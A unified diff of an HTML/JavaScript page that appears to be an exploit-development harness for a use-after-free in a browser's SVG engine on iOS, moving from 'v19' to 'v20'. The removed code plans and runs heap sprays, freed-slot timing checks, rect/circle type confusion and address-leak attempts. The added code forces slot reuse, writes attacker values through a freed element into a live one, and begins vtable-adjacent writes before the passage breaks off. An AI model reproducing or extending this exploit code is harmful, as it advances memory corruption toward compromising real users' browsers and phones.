@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v19 · AL exploitation · SVGAnimatedLength write primitive · iOS 26.5.2</title>
+<title>SVG UAF v20</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
@@ -13,685 +13,533 @@ button{background:#111;border:1px solid #333;color:#00ff41;padding:5px 12px;curs
 button:hover:not(:disabled){border-color:#00ff41}
 button:disabled{opacity:.3}
 #log{font-size:10px;line-height:1.6;white-space:pre-wrap;word-break:break-all;margin-top:6px}
-.ok{color:#00ff41}.bad{color:#ff4141}.inf{color:#ffcc00}.hi{color:#00cfff}.dim{color:#444}.sep{color:#222}
-#stage{position:fixed;top:10px;right:10px;width:220px;height:220px;background:#111;border:1px solid #222;z-index:9999;overflow:hidden}
+.ok{color:#00ff41}.bad{color:#ff4141}.inf{color:#ffcc00}.dim{color:#444}.sep{color:#222}
+#stage{position:fixed;top:10px;right:10px;width:200px;height:200px;background:#111;border:1px solid #222;z-index:9999;overflow:hidden}
 </style>
 </head>
 <body>
-<h2>SVG UAF v19 · AL exploitation · write primitive · iOS 26.5.2 A16 arm64e</h2>
-<div class="sub">
-  v18 CONFIRMED: SVGAnimatedLength UAF write 24/24 — animLen.baseVal.value=999 writes into freed SVGElement heap
-  v19: weaponize the AL write primitive
-  WIN: window size — how long does the freed slot stay readable/writable before bmalloc reclaims?
-  SPR: heap spray — free SVGElement, spray Float64Array, check if write lands in spray
-  TYP: type confusion — free SVGRectElement, spray SVGCircleElement, call methods via dangling ptr
-  VAR: variant gadgets — SVGAnimatedRect(viewBox), SVGAnimatedString(href), SVGLength chain
-  ADR: address leak — read freed heap bytes via animVal/baseVal across multiple SVG attr types
-</div>
+<h2>SVG UAF v20 - cross-object corruption - iOS 26.5.2</h2>
+<div class="sub">v20: IsoHeap reuse, live corruption, offset map, vtable-adjacent write</div>
 <div id="stage"><svg id="livesvg" width="200" height="200" viewBox="0 0 100 100"></svg></div>
 <div id="controls">
-  <button onclick="runWIN()">WIN window-size</button>
-  <button onclick="runSPR()">SPR heap-spray</button>
-  <button onclick="runTYP()">TYP type-confusion</button>
-  <button onclick="runVAR()">VAR gadget-variants</button>
-  <button onclick="runADR()">ADR addr-leak</button>
+  <button onclick="runRUS()">RUS reuse</button>
+  <button onclick="runCOR()">COR corrupt</button>
+  <button onclick="runVTP()">VTP vtable</button>
+  <button onclick="runOFS()">OFS offset</button>
+  <button onclick="runCNF()">CNF confirm</button>
   <button onclick="runAll()">RUN ALL</button>
   <button onclick="copyLog()">COPY</button>
   <button onclick="clearLog()">CLR</button>
 </div>
 <div id="log"></div>
 <script>
-/*
- * v18 RESULT:
- *   AL: 24/24 animW_base=80 animVal=80 write=999 unit=1 ctm_a=1
- *   SVGAnimatedLength holds m_contextElement raw C++ ptr
- *   After rect.remove():
- *     animLen.baseVal.value  → reads through freed m_contextElement → 80 (stale heap)
- *     animLen.baseVal.value = 999 → WRITES into freed heap memory
- *     animLen.animVal.value  → also reads freed memory → 80
- *     animLen.baseVal.unitType → reads freed heap enum field → 1 (px)
- *   This is a raw UAF read/write primitive on iOS 26.5.2
- *
- * v19 GOALS:
- *
- * WIN — window size:
- *   After free, how many JS operations until bmalloc reclaims the slot?
- *   bmalloc uses LIFO free lists — freed slot goes to IsoHeap first
- *   Any new SVGElement alloc of same size immediately takes the freed slot
- *   So: free rect → immediately alloc many new rects → check if animLen still reads 80
- *   If animLen.baseVal.value still = 80 → freed slot NOT yet reused
- *   If animLen.baseVal.value ≠ 80 → slot reused, we're reading new alloc
- *   Measure: how many allocs until value changes from 80?
- *   Also: time-based — how many microtasks/rafs until GC sweeps?
- *
- * SPR — heap spray into freed slot:
- *   free rect → immediately spray typed arrays of controlled size to land in freed slot
- *   SVGRectElement size ≈ 256-512 bytes (rough estimate — actual TBD)
- *   Spray 8-byte aligned Float64Array with sentinel value (1337.1337)
- *   Then read via animLen.baseVal.value — if value = 1337.1337 → spray landed in freed slot
- *   This gives us controlled-data-in-freed-slot → heap grooming primitive
- *   Also try: spray with ArrayBuffer, spray with plain objects
- *
- * TYP — type confusion:
- *   SVGRectElement and SVGCircleElement share common SVGGeometryElement base
- *   But their vtable layout differs — circle has cx/cy/r, rect has x/y/width/height
- *   Pattern:
- *     const rect = createRect()  // SVGRectElement*
- *     const animW = rect.width   // SVGAnimatedLength* with m_contextElement → rect
- *     rect.remove()              // free the SVGRectElement
- *     // Now spray SVGCircleElement allocs to land in freed rect slot
- *     const circles = Array.from({length:100}, () => createCircle())
- *     circles.forEach(c => livesvg.appendChild(c))
- *     // animW.m_contextElement now (may) point to a SVGCircleElement
- *     // animW thinks it's accessing SVGRectElement width attr
- *     // but the object at that address is now a SVGCircleElement
- *     // reading animW.baseVal.value → dispatches through circle's attr vtable
- *     // → potential type confusion: reads circle's cx/cy as if it were rect width
- *   Key: if we see unexpected values (circle.cx seen through rect.width lens) → type confusion
- *   Also: reading animW.animVal on a "circle" through "rect" SVGAnimatedLength → vtable confusion
- *
- * VAR — gadget variants:
- *   Test every SVG attribute type for the same UAF pattern:
- *     rect.x          → SVGAnimatedLength (also affected?)
- *     rect.y          → SVGAnimatedLength
- *     rect.rx         → SVGAnimatedLength (corner radius)
- *     element.viewBox → SVGAnimatedRect (4 floats: x,y,width,height)
- *     use.href        → SVGAnimatedString (string ptr — valuable for leak)
- *     text.dx         → SVGAnimatedLengthList
- *     path.pathLength → SVGAnimatedNumber
- *   Also: SVGLength.newValueSpecifiedUnits() — mutation through freed ptr
- *   Also: SVGLength.convertToSpecifiedUnits() — computation through freed ptr
- *
- * ADR — address leak attempt:
- *   Read multiple freed element's attributes across many data types
- *   Freed heap contains the element's original layout — vtable ptr at offset 0
- *   If animLen.baseVal.value returns raw bytes interpreted as float:
- *     any non-zero, non-80 value = raw heap/pointer data = address leak
- *   Method:
- *     Write sentinel float (e.g. 12345.0) to animLen.baseVal BEFORE free
- *     Free the element
- *     Immediately read back animLen.baseVal.value
- *     If still 12345.0 → confirming read of freed heap (no reuse)
- *     If different float → heap reused or overwritten → interesting data
- *   Also: read animLen.baseVal after spray with Float64Array(ptr_value)
- *     If we read back the ptr_value → we can see what the spray wrote
- */
+var SVG_NS = 'http://www.w3.org/2000/svg';
+var Lel = document.getElementById('log');
+var livesvg = document.getElementById('livesvg');
 
-const SVG_NS='http://www.w3.org/2000/svg';
-const Lel=document.getElementById('log');
-const livesvg=document.getElementById('livesvg');
-function log(m,c){const s=document.createElement('span');if(c)s.className=c;s.textContent=m+'\n';Lel.appendChild(s);Lel.scrollTop=Lel.scrollHeight;}
-const sep=()=>log('─'.repeat(52),'sep');
-const raf=()=>new Promise(r=>requestAnimationFrame(r));
-const tick=()=>new Promise(r=>setTimeout(r,0));
-const micro=()=>new Promise(r=>queueMicrotask(r));
-function copyLog(){try{navigator.clipboard.writeText(Lel.innerText);}catch(e){const a=document.createElement('textarea');a.value=Lel.innerText;document.body.appendChild(a);a.select();document.execCommand('copy');a.remove();}}
-function clearLog(){Lel.innerHTML='';}
-function dis(d){document.querySelectorAll('button').forEach(b=>{if(!b.onclick?.toString().match(/copy|clear/i))b.disabled=d;});}
-window.onerror=(m,_,l,c)=>{log(`[CRASH] ${m} L${l}:${c}`,'bad');return false;};
-window.onunhandledrejection=e=>{log(`[REJ] ${e.reason}`,'bad');};
-
-function mkRect(w=80,h=80,x=5,y=5){
-    const r=document.createElementNS(SVG_NS,'rect');
-    r.setAttribute('x',x);r.setAttribute('y',y);
-    r.setAttribute('width',w);r.setAttribute('height',h);
-    r.setAttribute('rx','3');r.setAttribute('fill','blue');
-    return r;
+function log(m, c) {
+  var s = document.createElement('span');
+  if (c) s.className = c;
+  s.textContent = m + '\n';
+  Lel.appendChild(s);
+  Lel.scrollTop = Lel.scrollHeight;
 }
-function mkCircle(r2=40,cx=50,cy=50){
-    const c=document.createElementNS(SVG_NS,'circle');
-    c.setAttribute('cx',cx);c.setAttribute('cy',cy);
-    c.setAttribute('r',r2);c.setAttribute('fill','red');
-    return c;
+function sep() { log('----------------------------------------------------', 'sep'); }
+function raf() { return new Promise(function(r){ requestAnimationFrame(r); }); }
+function tick() { return new Promise(function(r){ setTimeout(r, 0); }); }
+function micro() { return new Promise(function(r){ queueMicrotask(r); }); }
+
+function copyLog() {
+  try {
+    navigator.clipboard.writeText(Lel.innerText);
+  } catch(e) {
+    var a = document.createElement('textarea');
+    a.value = Lel.innerText;
+    document.body.appendChild(a);
+    a.select();
+    document.execCommand('copy');
+    a.remove();
+  }
 }
-function flush(){while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);}
+function clearLog() { Lel.innerHTML = ''; }
 
-// ── WIN: window size ─────────────────────────────────────────────────────
-async function runWIN(q=false){
-    if(!q){dis(true);sep();log('▶ WIN: window size — how long does freed slot stay accessible?','inf');sep();}
-    log('[*] free rect → alloc N new rects → check if animLen still reads freed value','inf');
-    log('[*] bmalloc LIFO: new SVGElement alloc immediately takes freed slot','ok');
-    log('[*] if animLen reads 80 → slot not yet reused; if 0 or other → reused','bad');log('');
-
-    // Test 1: how many new SVGElement allocs until freed slot is reused?
-    {
-        flush();await raf();await raf();
-        const rect=mkRect(80);livesvg.appendChild(rect);await raf();
-        const animW=rect.width;
-        const preW=animW?.baseVal?.value;
-
-        rect.remove();
-
-        let reusedAt=-1;
-        const newRects=[];
-        // Alloc up to 200 new rects and check after each batch
-        for(let i=0;i<200;i++){
-            const nr=mkRect(42); // different size to detect reuse
-            livesvg.appendChild(nr);
-            newRects.push(nr);
-
-            let cv=null;
-            try{cv=animW?.baseVal?.value;}catch(e){}
-
-            if(cv!==80&&cv!==null&&reusedAt===-1){
-                reusedAt=i;
-                log(`  [!] slot reused after ${i} allocs: animW=${cv} (expected 80)`,'bad');
-                break;
-            }
-        }
-        if(reusedAt===-1){
-            let cv=null;try{cv=animW?.baseVal?.value;}catch(e){}
-            log(`  slot NOT reused after 200 allocs: animW=${cv}`,'ok');
-        }
-        log(`  preW=${preW} reusedAt=${reusedAt}`,'inf');
-
-        // Also check: after a GC hint (alloc and free many large arrays)
-        flush();await raf();
-        let afterGC=null;
-        const bigArrays=[];
-        for(let i=0;i<20;i++){bigArrays.push(new ArrayBuffer(1024*1024));}
-        bigArrays.length=0; // release them
-        await tick();
-        try{afterGC=animW?.baseVal?.value;}catch(e){}
-        log(`  afterGC pressure animW=${afterGC}`,'inf');
+function dis(d) {
+  var btns = document.querySelectorAll('button');
+  for (var i = 0; i < btns.length; i++) {
+    var fn = btns[i].getAttribute('onclick') || '';
+    if (fn.indexOf('copy') === -1 && fn.indexOf('clear') === -1 && fn.indexOf('CLR') === -1) {
+      btns[i].disabled = d;
     }
-
-    // Test 2: timing — how many raf/tick/micro until slot reused?
-    {
-        flush();await raf();await raf();
-        const rect=mkRect(80);livesvg.appendChild(rect);await raf();
-        const animW=rect.width;
-        rect.remove();
-
-        let v0=null,v1=null,v2=null,v3=null,v4=null;
-        try{v0=animW?.baseVal?.value;}catch(e){}
-        await micro();try{v1=animW?.baseVal?.value;}catch(e){}
-        await tick();try{v2=animW?.baseVal?.value;}catch(e){}
-        await raf();try{v3=animW?.baseVal?.value;}catch(e){}
-        await raf();try{v4=animW?.baseVal?.value;}catch(e){}
-        log(`  timing: sync=${v0} micro=${v1} tick=${v2} raf=${v3} raf2=${v4}`,'inf');
-        log(`  [*] if all 80 → bmalloc doesn't reclaim without new SVGElement alloc`,'ok');
-    }
-
-    // Test 3: write persistence — write 999 then read back
-    {
-        flush();await raf();await raf();
-        const rect=mkRect(80);livesvg.appendChild(rect);await raf();
-        const animW=rect.width;
-        const bv=animW?.baseVal;
-        rect.remove();
-
-        let preWrite=null,postWrite=null,afterMicro=null,afterTick=null;
-        try{preWrite=bv?.value;}catch(e){}
-        try{bv.value=999;}catch(e){}
-        try{postWrite=bv?.value;}catch(e){}
-        await micro();try{afterMicro=bv?.value;}catch(e){}
-        await tick();try{afterTick=bv?.value;}catch(e){}
-        log(`  write test: pre=${preWrite} postWrite=${postWrite} afterMicro=${afterMicro} afterTick=${afterTick}`,'bad');
-        if(postWrite===999)log(`  [!!] write persists in freed memory across timing boundaries`,'bad');
-    }
-
-    if(!q)dis(false);
+  }
 }
 
-// ── SPR: heap spray into freed slot ──────────────────────────────────────
-async function runSPR(q=false){
-    if(!q){dis(true);sep();log('▶ SPR: heap spray — spray after free, check if data lands in freed slot','inf');sep();}
-    log('[*] free SVGRectElement → spray typed arrays → check animLen value','inf');
-    log('[*] if animLen.baseVal.value = sentinel → spray landed in freed slot!','bad');log('');
+window.onerror = function(m, u, l, c) {
+  log('[CRASH] ' + m + ' L' + l + ':' + c, 'bad');
+  return false;
+};
 
-    const SENTINEL=1337.1337;
-    const SENTINEL_F32=Math.fround(SENTINEL);
-    let sprayHit=0,sprayMiss=0;
-
-    // Try different array types as spray candidates
-    const spraySizes=[32,64,128,256,512,1024]; // bytes
-
-    for(const sprSize of spraySizes){
-        flush();await raf();await raf();
-        const rect=mkRect(80);livesvg.appendChild(rect);await raf();
-        const animW=rect.width;
-        const bv=animW?.baseVal;
-
-        const preV=bv?.value;
-
-        // FREE THE ELEMENT
-        rect.remove();
-
-        // IMMEDIATELY spray with controlled data
-        const nElems=sprSize/8;
-        const spray=[];
-        for(let i=0;i<512;i++){
-            const fa=new Float64Array(nElems);
-            fa.fill(SENTINEL);
-            spray.push(fa);
-        }
-
-        // READ BACK via dangling ptr
-        let postV=null;
-        try{postV=bv?.value;}catch(e){}
-
-        const hit=(postV!==null&&postV!==preV&&postV!==0);
-        if(hit){
-            sprayHit++;
-            log(`  sprSize=${sprSize}: [HIT] pre=${preV} post=${postV} SENTINEL=${SENTINEL}`,'bad');
-        }else{
-            sprayMiss++;
-            if(spraySizes.indexOf(sprSize)<3)log(`  sprSize=${sprSize}: pre=${preV} post=${postV} (no hit)`,'dim');
-        }
-
-        spray.length=0;
-        flush();await raf();
-    }
-
-    // Try spraying with object shapes
-    {
-        flush();await raf();await raf();
-        const rect=mkRect(80);livesvg.appendChild(rect);await raf();
-        const animW=rect.width;
-        const bv=animW?.baseVal;
-        const preV=bv?.value;
-        rect.remove();
-
-        // Spray with plain JS objects of various sizes
-        const objSpray=[];
-        for(let i=0;i<2000;i++){
-            objSpray.push({a:SENTINEL,b:SENTINEL,c:SENTINEL,d:SENTINEL,e:i,f:i,g:i,h:i});
-        }
-        let postV=null;try{postV=bv?.value;}catch(e){}
-        log(`  obj spray: pre=${preV} post=${postV}`,'inf');
-
-        // Spray with Uint8Array filled with a known byte pattern
-        const byteSpray=[];
-        for(let i=0;i<1000;i++){
-            const ua=new Uint8Array(256);
-            ua.fill(0x41); // 'AAAA...'
-            byteSpray.push(ua);
-        }
-        let postV2=null;try{postV2=bv?.value;}catch(e){}
-        log(`  byte(0x41) spray: pre=${preV} post=${postV2}`,'inf');
-
-        objSpray.length=0;byteSpray.length=0;
-    }
-
-    // Try spraying with new SVGElements of different type
-    {
-        flush();await raf();await raf();
-        const rect=mkRect(80);livesvg.appendChild(rect);await raf();
-        const animW=rect.width;
-        const bv=animW?.baseVal;
-        const preV=bv?.value;
-        rect.remove();
-
-        // Spray new rects of different size (width=42 as marker)
-        const rectSpray=[];
-        for(let i=0;i<100;i++){
-            const nr=mkRect(42,42);
-            livesvg.appendChild(nr);
-            rectSpray.push(nr);
-        }
-        let postV=null;try{postV=bv?.value;}catch(e){}
-        log(`  SVGRect(42) spray: pre=${preV} post=${postV} → ${postV===42?'[SLOT REUSE CONFIRMED]':'no hit'}`,(postV===42?'bad':'dim'));
-        log(`  [*] if post=42: new rect alloc reused freed slot → animLen now reads new rect's width`,(postV===42?'bad':'ok'));
-
-        flush();await raf();
-    }
-
-    log(`\n[*] SPR: hit=${sprayHit}/${spraySizes.length} miss=${sprayMiss}`,(sprayHit>0?'bad':'inf'));
-    if(!q)dis(false);
-    return{sprayHit,sprayMiss};
+function mkRect(w, h, x, y, rx) {
+  w = w || 80; h = h || 80; x = x || 5; y = y || 5; rx = rx || 3;
+  var r = document.createElementNS(SVG_NS, 'rect');
+  r.setAttribute('x', '' + x);
+  r.setAttribute('y', '' + y);
+  r.setAttribute('width', '' + w);
+  r.setAttribute('height', '' + h);
+  r.setAttribute('rx', '' + rx);
+  r.setAttribute('fill', 'blue');
+  return r;
 }
 
-// ── TYP: type confusion ───────────────────────────────────────────────────
-async function runTYP(q=false){
-    if(!q){dis(true);sep();log('▶ TYP: type confusion — free SVGRectElement, spray SVGCircleElement','inf');sep();}
-    log('[*] animLen holds m_contextElement ptr to freed SVGRectElement','inf');
-    log('[*] spray SVGCircleElement allocs to land in freed slot','ok');
-    log('[*] animLen.baseVal.value reads "rect.width" offset from a circle object','bad');
-    log('[*] if we see circle.cx/cy/r in the width read → type confusion!','bad');log('');
-
-    let confused=0,normal=0;
-
-    for(let t=0;t<20;t++){
-        flush();await raf();await raf();
-
-        // CREATE RECT (the victim)
-        const rect=mkRect(80);
-        livesvg.appendChild(rect);
-        await raf();
-
-        // Grab animLen before free
-        const animW=rect.width;
-        const animH=rect.height;
-        const animX=rect.x;
-        const animY=rect.y;
-        const bvW=animW?.baseVal;
-        const bvH=animH?.baseVal;
-        const bvX=animX?.baseVal;
-        const bvY=animY?.baseVal;
-
-        const preW=bvW?.value;
-        const preH=bvH?.value;
-
-        // FREE THE RECT
-        rect.remove();
-        // Don't wait — immediately spray
-
-        // SPRAY CIRCLES with distinctive values
-        const CX=55,CY=66,CR=33;
-        const circles=[];
-        for(let i=0;i<80;i++){
-            const c=mkCircle(CR,CX+(i%5),CY+(i%3));
-            livesvg.appendChild(c);
-            circles.push(c);
-        }
-
-        // READ BACK via dangling ptr that may now point to a circle
-        let postW=null,postH=null,postX=null,postY=null;
-        try{postW=bvW?.value;}catch(e){}
-        try{postH=bvH?.value;}catch(e){}
-        try{postX=bvX?.value;}catch(e){}
-        try{postY=bvY?.value;}catch(e){}
-
-        // Check for confusion: rect.width (=80) through circle = something else
-        // A circle's memory at rect.width's attr offset may contain cx or r
-        const isConfused=(postW!==null&&postW!==80&&postW!==0)||
-                         (postH!==null&&postH!==80&&postH!==0);
-
-        if(isConfused){
-            confused++;
-            log(`  t${t}: [TYPE CONFUSION] postW=${postW} postH=${postH} postX=${postX} postY=${postY} (expected W=80 H=80)`,'bad');
-            log(`  → could be reading cx=${CX} cy=${CY} r=${CR} from circle at rect's attr offsets`,'bad');
-        }else{
-            normal++;
-            if(t<3)log(`  t${t}: postW=${postW} postH=${postH} postX=${postX} postY=${postY} (no confusion)`,'dim');
-        }
-
-        flush();await raf();
-    }
-
-    // Also try: free rect, spray circles, then spray rects of SIZE=33 (matching CR)
-    // If we see 33 in animW → we know the heap slot was reused by something with 33 in it
-    {
-        flush();await raf();await raf();
-        const rect=mkRect(80);livesvg.appendChild(rect);await raf();
-        const animW=rect.width;const bvW=animW?.baseVal;
-        rect.remove();
-
-        // Spray rects with width=33
-        for(let i=0;i<100;i++){const nr=mkRect(33);livesvg.appendChild(nr);}
-        let postW=null;try{postW=bvW?.value;}catch(e){}
-        log(`\n  marker spray (w=33): postW=${postW} → ${postW===33?'[!!] SLOT REUSE=33, animLen redirected to new elem!':'no reuse'}`,(postW===33?'bad':'dim'));
-        log(`  [*] if postW=33: freed slot taken by new SVGRectElement(w=33)`, 'inf');
-        log(`  [*] → animLen UAF now reading from a DIFFERENT LIVE element`, 'inf');
-
-        flush();await raf();
-    }
-
-    log(`\n[*] TYP: confused=${confused}/20 normal=${normal}`,(confused>0?'bad':'inf'));
-    if(!q)dis(false);
-    return{confused,normal};
+function flush() {
+  while (livesvg.firstChild) livesvg.removeChild(livesvg.firstChild);
 }
 
-// ── VAR: gadget variants ─────────────────────────────────────────────────
-async function runVAR(q=false){
-    if(!q){dis(true);sep();log('▶ VAR: gadget variants — all SVGAnimated* types for UAF','inf');sep();}
-    log('[*] test every SVGAnimated* type for same m_contextElement dangling ptr UAF','inf');
-    log('[*] each type = additional read/write gadget for exploitation','ok');log('');
+// RUS: IsoHeap reuse - find alloc count to force slot reuse
+async function runRUS(q) {
+  if (!q) { dis(true); sep(); log('RUS: IsoHeap reuse - find when freed slot gets reused', 'inf'); sep(); }
+  log('[*] free A(w=80), alloc 1..256 new rects, check when animLen_A reads new width', 'ok');
 
-    flush();await raf();await raf();
+  var reuse_at = -1;
+  var reuse_val = null;
+  var BASE_W = 100;
 
-    const rect=mkRect(80,60);
-    rect.setAttribute('rx','12');
-    rect.setAttribute('ry','7');
-    livesvg.appendChild(rect);
+  flush(); await raf(); await raf();
 
-    // Also add an SVG with viewBox
-    const innerSvg=document.createElementNS(SVG_NS,'svg');
-    innerSvg.setAttribute('viewBox','0 0 100 200');
-    innerSvg.setAttribute('width','100');
-    innerSvg.setAttribute('height','100');
-    livesvg.appendChild(innerSvg);
+  var A = mkRect(80);
+  livesvg.appendChild(A);
+  await raf(); await raf();
 
-    // SVGUseElement for href test
-    const useEl=document.createElementNS(SVG_NS,'use');
-    useEl.setAttribute('href','#nosuchelem');
-    livesvg.appendChild(useEl);
+  var animW_A = A.width;
+  var bv_A = animW_A ? animW_A.baseVal : null;
+  var A_w = bv_A ? bv_A.value : null;
+  log('  A created: w=' + A_w + ' (expected 80)', 'ok');
 
-    // SVG text for textLength
-    const textEl=document.createElementNS(SVG_NS,'text');
-    textEl.textContent='HI';
-    textEl.setAttribute('x','10');textEl.setAttribute('y','30');
-    livesvg.appendChild(textEl);
+  A.remove();
+  await micro();
 
+  var freed_read = null;
+  try { freed_read = bv_A ? bv_A.value : null; } catch(e) {}
+  log('  A freed: animLen_A reads ' + freed_read + ' (should still be 80)', 'ok');
+
+  var alloced = [];
+  for (var i = 0; i < 256; i++) {
+    var w = BASE_W + i;
+    var nr = mkRect(w, w);
+    livesvg.appendChild(nr);
+    alloced.push(nr);
+
+    var curr = null;
+    try { curr = bv_A ? bv_A.value : null; } catch(e) {}
+
+    if (curr !== A_w && curr !== null) {
+      reuse_at = i;
+      reuse_val = curr;
+      log('  [!!] SLOT REUSE at alloc #' + i + ': animLen_A now reads ' + curr, 'bad');
+      log('  new rect w=' + w + ' landed in freed slot', 'bad');
+      var confirmW = null;
+      try { confirmW = alloced[i].width.baseVal.value; } catch(e) {}
+      log('  alloced[' + i + '].width.baseVal = ' + confirmW, 'ok');
+      break;
+    }
+
+    if (i > 0 && i % 64 === 0) {
+      log('  after ' + i + ' allocs: animLen_A still reads ' + curr, 'dim');
+    }
+  }
+
+  if (reuse_at === -1) {
+    var final_read = null;
+    try { final_read = bv_A ? bv_A.value : null; } catch(e) {}
+    log('  no reuse after 256 allocs - animLen_A still reads ' + final_read, 'inf');
+    log('  [*] IsoPage bump > 256 rects threshold', 'inf');
+  } else {
+    log('  RESULT: reuse_at=' + reuse_at + ' reuse_val=' + reuse_val, 'bad');
+  }
+
+  flush(); await raf();
+  if (!q) dis(false);
+  return { reuse_at: reuse_at, reuse_val: reuse_val, A_w: A_w };
+}
+
+// COR: live corruption - write via freed A into live B
+async function runCOR(q) {
+  if (!q) { dis(true); sep(); log('COR: live corruption - write via freed A into live B', 'inf'); sep(); }
+  log('[*] free A, write ATTACK via animLen_A, alloc B nearby, check if B shows ATTACK', 'ok');
+
+  var corruptionConfirmed = false;
+  var ATTACK = 4242.0;
+
+  // Phase 1: write into freed slot, then alloc many B's looking for reuse
+  flush(); await raf(); await raf();
+
+  var A1 = mkRect(80);
+  livesvg.appendChild(A1);
+  await raf(); await raf();
+
+  var bv_A1 = A1.width ? A1.width.baseVal : null;
+  A1.remove();
+  await micro();
+
+  var MAGIC = 7654.0;
+  try { if (bv_A1) bv_A1.value = MAGIC; } catch(e) {}
+  var confirmMagic = null;
+  try { confirmMagic = bv_A1 ? bv_A1.value : null; } catch(e) {}
+  log('  Phase1: wrote MAGIC=' + MAGIC + ' into freed slot, readback=' + confirmMagic, 'inf');
+
+  var victims = [];
+  for (var i = 0; i < 256; i++) {
+    var B = mkRect(42 + i);
+    livesvg.appendChild(B);
+    victims.push(B);
+
+    var curr = null;
+    try { curr = bv_A1 ? bv_A1.value : null; } catch(e) {}
+
+    if (curr !== MAGIC && curr !== null && curr !== 0) {
+      log('  Phase1: slot reused at i=' + i + ' animLen_A reads ' + curr + ' (B.width=' + (42+i) + ')', 'bad');
+      try { if (bv_A1) bv_A1.value = 9999; } catch(e) {}
+      var bW = null;
+      try { bW = victims[i].width ? victims[i].width.baseVal.value : null; } catch(e) {}
+      var bBBox = null;
+      try { bBBox = victims[i].getBBox ? victims[i].getBBox().width : null; } catch(e) {}
+      log('  wrote 9999 via animLen_A - B.width.baseVal=' + bW + ' B.getBBox().w=' + bBBox, 'bad');
+      if (bW === 9999 || bBBox === 9999) {
+        corruptionConfirmed = true;
+        log('  [!!] LIVE CORRUPTION CONFIRMED: B.width=' + bW + ' without setAttribute!', 'bad');
+      }
+      break;
+    }
+  }
+
+  flush(); await raf();
+
+  // Phase 2: adjacent alloc approach
+  log('  Phase2: rapid alloc/free pairs to find adjacent heap elements...', 'inf');
+  var found = false;
+
+  for (var attempt = 0; attempt < 20 && !found; attempt++) {
+    flush(); await raf();
+
+    var A2 = mkRect(80);
+    livesvg.appendChild(A2);
     await raf();
+    var bv_A2 = A2.width ? A2.width.baseVal : null;
 
-    // Grab all animated attribute types BEFORE removal
-    const gadgets={};
-    try{gadgets.rectW=rect.width;}catch(e){}       // SVGAnimatedLength
-    try{gadgets.rectH=rect.height;}catch(e){}
-    try{gadgets.rectX=rect.x;}catch(e){}
-    try{gadgets.rectY=rect.y;}catch(e){}
-    try{gadgets.rectRx=rect.rx;}catch(e){}
-    try{gadgets.rectRy=rect.ry;}catch(e){}
-    // SVGAnimatedRect — holds 4 floats
-    try{gadgets.svgVB=innerSvg.viewBox;}catch(e){}
-    // SVGAnimatedString
-    try{gadgets.useHref=useEl.href;}catch(e){}
-    // SVGAnimatedLength on text
-    try{gadgets.textTL=textEl.textLength;}catch(e){}
+    var B2 = mkRect(55);
+    livesvg.appendChild(B2);
+    await raf();
+    var bv_B2 = B2.width ? B2.width.baseVal : null;
+    var B_preW = bv_B2 ? bv_B2.value : null;
 
-    // Read pre-removal values
-    const pre={};
-    try{pre.rectW=gadgets.rectW?.baseVal?.value;}catch(e){}
-    try{pre.rectH=gadgets.rectH?.baseVal?.value;}catch(e){}
-    try{pre.rectX=gadgets.rectX?.baseVal?.value;}catch(e){}
-    try{pre.rectY=gadgets.rectY?.baseVal?.value;}catch(e){}
-    try{pre.rectRx=gadgets.rectRx?.baseVal?.value;}catch(e){}
-    try{pre.rectRy=gadgets.rectRy?.baseVal?.value;}catch(e){}
-    try{pre.svgVBW=gadgets.svgVB?.baseVal?.width;}catch(e){}
-    try{pre.svgVBH=gadgets.svgVB?.baseVal?.height;}catch(e){}
-    try{pre.useHref=gadgets.useHref?.baseVal;}catch(e){}
-    try{pre.textTL=gadgets.textTL?.baseVal?.value;}catch(e){}
+    A2.remove();
+    await micro();
+    try { if (bv_A2) bv_A2.value = ATTACK; } catch(e) {}
 
-    log(`  pre-remove: rectW=${pre.rectW} H=${pre.rectH} X=${pre.rectX} Y=${pre.rectY} Rx=${pre.rectRx} Ry=${pre.rectRy}`,'ok');
-    log(`  pre-remove: viewBox W=${pre.svgVBW} H=${pre.svgVBH} href='${pre.useHref}' textTL=${pre.textTL}`,'ok');
+    var B_postW = null;
+    try { B_postW = bv_B2 ? bv_B2.value : null; } catch(e) {}
+    var B_bbox = null;
+    try { B_bbox = B2.getBBox ? B2.getBBox().width : null; } catch(e) {}
+    var B_native = null;
+    try { B_native = B2.width ? B2.width.baseVal.value : null; } catch(e) {}
 
-    // FREE ALL ELEMENTS
-    rect.remove();
-    innerSvg.remove();
-    useEl.remove();
-    textEl.remove();
+    if (B_postW === ATTACK || B_bbox === ATTACK || B_native === ATTACK) {
+      found = true;
+      corruptionConfirmed = true;
+      log('  [!!] CROSS-OBJECT CORRUPTION! attempt=' + attempt, 'bad');
+      log('    B: bv=' + B_postW + ' bbox=' + B_bbox + ' native=' + B_native, 'bad');
+      log('    B shows ATTACK value without setAttribute!', 'bad');
+    } else {
+      if (attempt < 3) {
+        log('  attempt=' + attempt + ': B_postW=' + B_postW + ' bbox=' + B_bbox, 'dim');
+      }
+    }
+
+    flush(); await raf();
+  }
+
+  if (!found) log('  Phase2: no cross-object hit in 20 attempts', 'inf');
+
+  log('[*] COR: corruptionConfirmed=' + corruptionConfirmed, corruptionConfirmed ? 'bad' : 'inf');
+  if (!q) dis(false);
+  return { corruptionConfirmed: corruptionConfirmed };
+}
+
+// VTP: vtable-adjacent write - map sentinel survival into live elements
+async function runVTP(q) {
+  if (!q) { dis(true); sep(); log('VTP: vtable-adjacent - sentinel survival into live B', 'inf'); sep(); }
+  log('[*] write unique sentinels via each gadget, alloc B, check if B shows sentinel', 'ok');
+
+  var SENTINELS = {
+    width:  11110000.0,
+    height: 22220000.0,
+    x:      33330000.0,
+    y:      44440000.0,
+    rx:     55550000.0,
+    ry:     66660000.0
+  };
+  var sentVals = [11110000.0, 22220000.0, 33330000.0, 44440000.0, 55550000.0, 66660000.0];
+
+  var vtpHit = 0;
+
+  for (var trial = 0; trial < 10; trial++) {
+    flush(); await raf(); await raf();
+
+    var A = mkRect(80, 60);
+    A.setAttribute('rx', '12');
+    A.setAttribute('ry', '7');
+    livesvg.appendChild(A);
+    await raf(); await raf();
+
+    var g = {
+      width:  A.width  ? A.width.baseVal  : null,
+      height: A.height ? A.height.baseVal : null,
+      x:      A.x      ? A.x.baseVal      : null,
+      y:      A.y      ? A.y.baseVal      : null,
